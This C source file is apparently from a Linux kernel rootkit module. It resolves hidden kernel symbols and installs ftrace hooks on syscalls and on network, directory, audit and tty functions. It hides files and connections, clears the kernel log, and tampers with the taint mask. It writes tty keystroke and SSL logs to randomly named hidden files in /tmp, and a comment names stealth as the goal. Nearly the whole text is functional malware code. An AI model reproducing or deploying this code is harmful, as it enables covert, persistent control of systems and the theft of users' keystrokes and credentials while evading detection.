struct kernel_syscalls *kv_kall_load_addr(void)
{
	static struct kernel_syscalls ks;

	if (!ks.k_kallsyms_lookup_name) {
		static struct kprobe kps;

		kps.symbol_name = "kallsyms_lookup_name";
		register_kprobe(&kps);
		ks.k_kallsyms_lookup_name = (kallsyms_lookup_name_sg)kps.addr;
		unregister_kprobe(&kps);
		prinfo("kv: using kprobe for kallsyms_lookup_name\n");

		ks.k_attach_pid =
			(attach_pid_sg)ks.k_kallsyms_lookup_name("attach_pid");
		if (!ks.k_attach_pid)
			prwarn("invalid data: attach_pid will not work\n");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
		ks.k_bpf_map_get = (bpf_map_get_sg)ks.k_kallsyms_lookup_name(
			"bpf_map_get");
#else
		ks.k_bpf_map_get = (bpf_map_get_sg)ks.k_kallsyms_lookup_name(
			"__bpf_map_get");
#endif

		ks.k_do_syslog =
			(do_syslog_sg)ks.k_kallsyms_lookup_name("do_syslog");
		if (!ks.k_do_syslog)
			prwarn("invalid data: do_syslog will not work\n");

		if (!ks.k_bpf_map_get)
			prwarn("invalid data: bpf_map_get will not work\n");

		// Direct call. @see m_kill
		ks.k_sys_setreuid = (sys64)_load_syscall_variant(
			&ks, _sys_arch("sys_setreuid"));

		if (!ks.k_sys_setreuid)
			prwarn("invalid data: syscall hook setreuid will not work\n");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
		ks.k_do_exit = (do_exit_sg)ks.k_kallsyms_lookup_name("do_exit");
		if (!ks.k_do_exit)
			prwarn("invalid data: do_exit will not work\n");
#endif
		// zero tainted_mask for the bits we care
		ks.tainted = (unsigned long *)ks.k_kallsyms_lookup_name(
			"tainted_mask");

		ks.k__set_task_comm =
			(do__set_task_comm_sg)ks.k_kallsyms_lookup_name(
				"__set_task_comm");
		if (!ks.k__set_task_comm)
			prwarn("invalid data: __set_task_comm will not work\n");
	}
	return &ks;
}

static struct ftrace_hook ft_hooks[] = {
	{ _sys_arch("sys_exit_group"), m_exit_group, &real_m_exit_group, true },
	{ _sys_arch("sys_clone"), m_clone, &real_m_clone, true },
	{ _sys_arch("sys_kill"), m_kill, &real_m_kill, true },
	{ _sys_arch("sys_read"), m_read, &real_m_read, true },
	{ _sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true },
	{ _sys_arch("sys_recvmsg"), m_recvmsg, &real_m_recvmsg, true },
	{ _sys_arch("sys_lseek"), m_lseek, &real_m_lseek, true },
	{ "tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show },
	{ "udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show },
	{ "tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show },
	{ "udp6_seq_show", m_udp6_seq_show, &real_m_udp6_seq_show },
	{ "packet_rcv", m_packet_rcv, &real_packet_rcv },
	{ "tpacket_rcv", m_tpacket_rcv, &real_tpacket_rcv },
	{ "account_process_tick", m_account_process_tick,
	  &real_account_process_tick },
	{ "account_system_time", m_account_system_time,
	  &real_account_system_time },
	{ "audit_log_start", m_audit_log_start, &real_audit_log_start },
	{ "filldir", m_filldir, &real_filldir },
	{ "filldir64", m_filldir64, &real_filldir64 },
	{ "tty_read", m_tty_read, &real_tty_read },
	{ "proc_dointvec", m_proc_dointvec, &real_proc_dointvec },
	{ "vfs_statx", m_vfs_statx, &real_vfs_statx },

	{ NULL, NULL, NULL },
};

static int _fh_install_hook(struct ftrace_hook *hook)
{
	int err;

	if ((err = fh_resolve_hook_address(hook)))
		return err;

	hook->ops.func = fh_ftrace_thunk;

	// Note: For kernels >= v5.5 there is FTRACE_OPS_FL_PERMANENT
	// but then we'd not be stealth.
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
			  FTRACE_OPS_FL_IPMODIFY;

	if ((err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0))) {
		prerr("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	if ((err = register_ftrace_function(&hook->ops))) {
		prerr("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}

static void _fh_remove_hook(struct ftrace_hook *hook)
{
	int err;
#ifdef DEBUG_RING_BUFFER
	if (hook && hook->name)
		prinfo("Uninstalling: '%s' syscall=%d\n", hook->name,
		       hook->syscall);
#endif
	if ((err = unregister_ftrace_function(&hook->ops)))
		prerr("unregister_ftrace_function() failed: %d\n", err);

	if ((err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0)))
		prerr("ftrace_set_filter_ip() failed: %d\n", err);
}

static int _fh_install_hooks(struct ftrace_hook *hooks)
{
	int rc = 0;
	size_t i = 0;

	for (; hooks[i].name != NULL; i++) {
		prinfo("Installing: '%s' syscall=%d\n", hooks[i].name,
		       hooks[i].syscall);
		if ((rc = _fh_install_hook(&hooks[i])))
			goto unroll;
	}
	goto leave;
unroll:
	while (i != 0) {
		_fh_remove_hook(&hooks[--i]);
	}
leave:
	return rc;
}

static void _fh_remove_hooks(struct ftrace_hook *hooks)
{
	size_t i = 0;
	for (; hooks[i].name != NULL; i++) {
		_fh_remove_hook(&hooks[i]);
	}
}

struct sysfiles_t {
	char ttyfile[PATH_MAX];
	char sslfile[PATH_MAX];
};
static struct sysfiles_t sysfiles;
static bool _sys_file_init(void)
{
	bool rc = false;
	char *tty, *ssl;
	size_t min = 16, max = 64, len = 0;
	u8 rnd = 0;

	get_random_bytes(&rnd, sizeof(rnd));
	len = min + (rnd % (max - min + 1));
	tty = kv_util_random_AZ_string(len);

	// XXX: repeat, really?
	get_random_bytes(&rnd, sizeof(rnd));
	len = min + (rnd % (max - min + 1));
	ssl = kv_util_random_AZ_string(len);

	if (tty && ssl) {
		snprintf(sysfiles.ttyfile, sizeof(sysfiles.ttyfile) - 1,
			 "/tmp/.%s", tty);

		snprintf(sysfiles.sslfile, sizeof(sysfiles.sslfile) - 1,
			 "/tmp/.%s", ssl);
		kv_mem_free(&tty, &ssl);

		rc = true;
	}

	return rc;
}

int sys_do_syslog_clear(void)
{
	struct kernel_syscalls *ks = kv_kall_load_addr();
	if (!ks || !ks->k_do_syslog)
		return -EINVAL;

	return ks->k_do_syslog(SYSLOG_ACTION_CLEAR, NULL, 0, SYSLOG_FROM_PROC);
}

char *sys_get_ttyfile(void)
{
	return sysfiles.ttyfile;
}
char *sys_get_sslfile(void)
{
	return sysfiles.sslfile;
}

bool sys_init(void)
{
	int idx = 0, rc = false;

	if (_sys_file_init()) {
		char *tty = strrchr(sys_get_ttyfile(), '.');
		char *ssl = strrchr(sys_get_sslfile(), '.');

		if (!tty || !ssl) {
			prerr("sys_init: Invalid parameter\n");
			return rc;
		}

		// init fist a couple of hidden files
		fs_add_name_ro(tty, 0);
		fs_add_name_ro(ssl, 0);

		rc = !_fh_install_hooks(ft_hooks);
		if (rc) {
			for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
				prinfo("sys_init: ftrace hook %d on %s\n", idx,
				       ft_hooks[idx].name);

			// Init tty log
			tty_sys_ctx =
				kv_tty_open(&tty_sys_ctx, sys_get_ttyfile());
			if (!tty_sys_ctx.fp) {
				prerr("sys_init: Failed loading tty file\n");
				rc = false;
			}
		}
	}
	return rc;
}

void sys_deinit(void)
{
	struct sys_addr_list *sl, *sl_safe;

	_fh_remove_hooks(ft_hooks);
	fs_file_rm(sys_get_sslfile());
	_keylog_cleanup();

	list_for_each_entry_safe (sl, sl_safe, &sys_addr, list) {
		list_del(&sl->list);
		kfree(sl);
	}
}
